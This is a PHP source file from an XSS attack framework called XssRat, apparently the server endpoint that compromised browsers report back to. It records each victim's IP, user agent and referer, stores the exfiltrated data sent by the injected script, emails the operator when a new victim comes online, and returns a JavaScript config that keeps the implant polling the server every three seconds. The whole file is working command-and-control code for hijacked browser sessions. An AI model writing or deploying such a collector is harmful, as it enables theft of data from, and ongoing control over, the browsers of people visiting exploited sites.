<?php
/* 
 * Created on 2014��4��7��
 * @project XssRat
 * @author owlinrye
 * @email blackrat.sec@gmail.com
 * An easy Xss framework
 * 
 * get result from client
 */
 
header("Content-Type: application/javascript; charset=UTF-8");
require_once("../bin/Path.php"); 
require_once(PHP_BASE_DIR."/db/MySQL.php");
require_once(PHP_BASE_DIR."/util/util.php");
require_once(PHP_BASE_DIR."/entity/Project.php");
require_once(PHP_BASE_DIR."/entity/User.php");
require_once(PHP_BASE_DIR."/entity/ProjectModuleData.php");
require_once(PHP_BASE_DIR."/entity/AttackData.php");

function get_real_ip(){
	// 获取真实IP
	$ip=false;
	if(!empty($_SERVER["HTTP_CLIENT_IP"]))
	{
		$ip = $_SERVER["HTTP_CLIENT_IP"];
	}
	if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
	{
		$ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);
		if ($ip)
		{
			array_unshift($ips, $ip); $ip = FALSE;
		}
		for ($i = 0; $i < count($ips); $i++)
		{
			if (!preg_match ("/^(10|172\.16|192\.168)\./i", $ips[$i]))
			{
			$ip = $ips[$i];
			break;
			}
		}
	}
	return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);
}

function get_user_agent(){
	// 获取User-Agent
	return $_SERVER['HTTP_USER_AGENT'];
}

function get_referer(){
	// 获取Referer
	return $_SERVER['HTTP_REFERER'];
}

function quotes($content){
	if(get_magic_quotes_gpc()){
		if(is_array($content)){
			foreach($content as $key=>$value){
				$content[$key] = stripslashes($value);
			}
		}else{
			$content = stripslashes($content);}
	}else{}
	return $content;
}


if (!empty($_REQUEST["c"])&&!empty($_REQUEST["t"])){
	$curtime = date("Y-m-d H:i:s");
	$ip = get_real_ip();
	$useragent = get_user_agent();
	$referer = get_referer();
	$ticket = $_REQUEST["t"];
	$data = $_REQUEST["c"];
	$pmd_id = $_REQUEST["i"];
	$a_id = $_REQUEST["a"];
	$ec = $_REQUEST["ec"];
	
	if(empty($pmd_id)||$pmd_id=="undefined"||$pmd_id=="null") $pmd_id = 0;
	else $pmd_id = (int)$pmd_id;
	
	if(empty($a_id)||$a_id=="undefined"||$a_id=="null") $a_id = 0;
	else $a_id = (int)$a_id;
	
	
	$db = new MySQL($log);
	$mysqli = $db->openDB();
	
	if($mysqli!==null){
		
		$project = new Project($mysqli,$log);
		$pmd = new ProjectModuleData($mysqli,$log);
		$attackData = new AttackData($mysqli,$log);
		
		//如果 pmd_id 和 a_id 存在  说明是已经上线的主机  
		if($pmd_id>0&&$a_id >0){
			
			$pmd->updateStatus($pmd_id,1);//更新客户端状态信息为在线
			//更新攻击数据
			$attackData -> updateData($a_id,urldecode($data));
						
		}else{
			//如果  pmd_id 和 a_id 都不存在 说明是下线的主机或者新的主机
			$res = $pmd->getPmdByEC($ec,$ticket);
			 
			
			if($res){//在之前已经有记录  是刚上线的主机
				$pmd_id = $pmd -> pmd_id;
				$pmd->updateStatus($pmd_id,1);//更新客户端状态信息为在线
			}else{//新主机
				$res = $project -> getProjectByTicket($ticket);
				if($res){
					$pmd -> ticket= $ticket;
					$pmd -> p_id= $project->id;
					$pmd -> clientIP= htmlspecialchars(quotes($ip));
					$pmd -> time = $curtime;
					$pmd -> status = 1;
					$pmd -> ec = $ec;
					$pmd -> userAgent = htmlspecialchars(quotes($useragent));
					$pmd -> Referer = htmlspecialchars(quotes($referer));
					$pmd -> Data = utf8_decode(urldecode($data));
					$pmd_id = $pmd -> addPMD();
				}
			}
			
			$email = $project->getMailByTiket($ticket);
			if($email){
				//sea maill
				$saemail = new SaeMail();
				$message = "亲爱的用户，你有新用户上线了。
							
	IP:" .$pmd -> clientIP."
	Referer:" .$pmd -> Referer."
	userAgent:" .$pmd -> userAgent."
	
	本邮件来自于: http://xssrat.sinaapp.com
	Mak3 hack m0r3 c00l!";
				$ret = $saemail->quickSend($email,'XSSRAT - 新用户上线',$message,MAIL_ACCOUNT,MAIL_PASS);
				if ($ret === false){
					$log->error($mail->errmsg());
				}
			}
			
			
		}
		$db->closeDB();		
	}
	
	$net_config = "rat.net.config = { protocol:\"".get_protocol()."\"," .
			"port:".get_port().",host:\"".get_host()."\",api_path:\"".get_page_path()."\"," .
			"interval:3000,ticket:\"".htmlspecialchars($ticket)."\",pmd_id:\"".$pmd_id."\",a_id:0};\n";
	$log->info("Time:".$curtime." IP:".$ip." UA:".$useragent." RE:".$referer." DATA:".$data);
	die($net_config);
}

?>
